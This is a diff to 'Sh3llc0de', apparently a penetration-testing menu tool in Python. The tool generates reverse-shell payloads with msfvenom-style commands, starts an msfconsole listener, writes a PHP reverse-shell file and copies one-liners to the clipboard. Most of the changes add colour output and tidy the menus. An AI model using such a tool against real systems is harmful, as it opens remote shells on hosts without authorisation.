@@ -14,15 +14,46 @@ import query_yes_no
 import pyperclip
 import argparse
 import show_ips
+import sys
+from colorama import init
+from termcolor import colored
+from pyfiglet import figlet_format
+
+init(strip=not sys.stdout.isatty())
 
 parser = argparse.ArgumentParser(description='Build shellcode for multiple platforms.')
 
 parser.add_argument('host', help='Host to use for the shellcode', nargs='?', default="127.0.0.1", type=str)
 parser.add_argument('port', help='Port to use for the shellcode', nargs='?', default=1234, type=int)
-parser.add_argument('--php_filename', help='php filename to save as', default='php-reverse-shell.php', type=str)
-parser.add_argument('--msf_file_basename', help='msf filename to save as', default='shell', type=str)
+parser.add_argument('--php_filename', help='php filename to save as. (Default:php-reverse-shell.php)',
+                    default='php-reverse-shell.php', type=str)
+parser.add_argument('--msf_file_basename', help='msf basename to save as. (Default: shell)', default='shell', type=str)
 
 args = parser.parse_args()
+
+
+def info(text):
+    return colored(text, "blue")
+
+
+def error(text):
+    return colored(text, "red")
+
+
+def ask(text):
+    return colored(text, "yellow")
+
+
+def reminder(text):
+    return colored(text, "green")
+
+
+def option(text):
+    return colored(text, "cyan")
+
+
+def option2(text):
+    return colored(text, "magenta")
 
 
 def msf_generate(payload):
@@ -30,9 +61,9 @@ def msf_generate(payload):
         payload['payload'], args.host, args.port, payload['format'], payload['filename'])
     terminal = 'msfconsole -qx "use exploit/multi/handler;set payload %s;set LHOST %s;set LPORT %s;exploit"' % (
         payload['payload'], args.host, args.port)
-    print("Generating payload: " + shell_code)
+    print(info("Generating payload: " + shell_code))
     os.system(shell_code)
-    if query_yes_no.query_yes_no("Do you want to setup the listener?"):
+    if query_yes_no.query_yes_no(ask("Do you want to setup the listener?")):
         os.system(terminal)
     else:
         exit()
@@ -52,7 +83,7 @@ def php_file_pentestmonkey(payload=None):
             fout.write(line)
     fin.close()
     fout.close()
-    print("File created and updated as: " + filename)
+    print(info("File created and updated as: " + filename))
 
 
 # Other resources
@@ -60,16 +91,16 @@ def php_file_pentestmonkey(payload=None):
 
 # One liner shortcode
 def oneliner(payload):
-    print(payload['payload'] + " Copied to clipboard")
+    print(info(payload['payload'] + " Copied to clipboard"))
     pyperclip.copy(payload['payload'])
     if 'tty' in payload and payload['tty'] is True:
-        print("\nRemember:")
-        print("<ctrl+z> # to background"
-              "\nstty raw -echo"
-              "\nfg<enter>"
-              "\n<enter>"
-              "\n<enter>"
-              "\n# optional: export TERM=vt100")
+        print(reminder("\nRemember:"))
+        print(reminder("<ctrl+z> # to background"
+                       "\nstty raw -echo"
+                       "\nfg<enter>"
+                       "\n<enter>"
+                       "\n<enter>"
+                       "\n# optional: export TERM=vt100"))
     exit()
 
 
@@ -261,10 +292,10 @@ def getcwd():
 def main_menu(clear=True, items=None):
     if clear is True:
         cls()
-    print("Working Directory is {dir},\n".format(dir=os.getcwd()))
-    print("What code are you looking for?")
+    print(info("Working Directory is {dir}\n".format(dir=os.getcwd())))
+    print(ask("Please select a menu option below:"))
     for index, value in enumerate(items):
-        print(str(index) + ": " + value['title'])
+        print(option(str(index) + ": " + value['title']))
     footer(items)
 
 
@@ -284,19 +315,19 @@ def exec_menu(choice, item=None):
             if 'submenu' in item:
                 handle_payloads(item)
         except KeyError:
-            print("Invalid selection, please try again.\n")
+            print(error("Invalid selection, please try again.\n"))
             main_menu(clear=False, items=payloads)
     return
 
 
 def footer_text():
-    print("\n\n99. Home")
-    print("00. Quit")
+    print(option2("\n99. Home"))
+    print(option2("00. Quit"))
 
 
 def footer(menu_items):
     footer_text()
-    choice = input(" >>  ")
+    choice = input(ask(" >>  "))
     selected_item = None
     for index, value in enumerate(menu_items):
         if choice == str(index):
@@ -306,24 +337,24 @@ def footer(menu_items):
 
 
 def handle_payloads(item):
-    print(item['generate_title'])
+    print(ask(item['generate_title']))
     for index, value in enumerate(item['submenu']):
         if value['title'] != '':
-            print(str(index) + ": " + value['title'])
+            print(option(str(index) + ": " + value['title']))
         else:
-            print(str(index) + ": " + value['payload'])
+            print(option(str(index) + ": " + value['payload']))
     footer_text()
-    selected = input("Please select an option: ")
-    if selected == "00" or selected == "99":
-        exec_menu(selected)
+    choice = input(ask(" >>  "))
+    if choice == "00" or choice == "99":
+        exec_menu(choice)
         return
     selected_payload = None
     for index, value in enumerate(item['submenu']):
-        if selected == str(index):
+        if choice == str(index):
             selected_payload = value
     try:
         if selected_payload is None:
-            raise
+            raise ValueError
         # try function on individual items
         if 'function' in selected_payload and selected_payload['function'] is not None \
                 and selected_payload['function']['function_name'] is not None:
@@ -334,9 +365,8 @@ def handle_payloads(item):
             item['function']['function_name'](selected_payload)
             return
         return
-    except ValueError as e:
-        print(e)
-        print("Something went wrong please try again.")
+    except ValueError:
+        print(error("Something went wrong please try again."))
         handle_payloads(item)
 
 
@@ -344,13 +374,8 @@ def handle_payloads(item):
 if __name__ == "__main__":
     # Launch main menu
     cls()
-    import sys
-    from colorama import init
 
-    init(strip=not sys.stdout.isatty())
-    from termcolor import colored
-    from pyfiglet import figlet_format
-
-    print(colored(figlet_format("Sh3llc0de", font="standard"), "blue"))
+    print(info(figlet_format("Sh3llc0de", font="standard")))
+    print(ask("\nCreated By: Thomas Norberg and Matthew Hyde"))
     show_ips.show_ips()
     main_menu(clear=False, items=payloads)
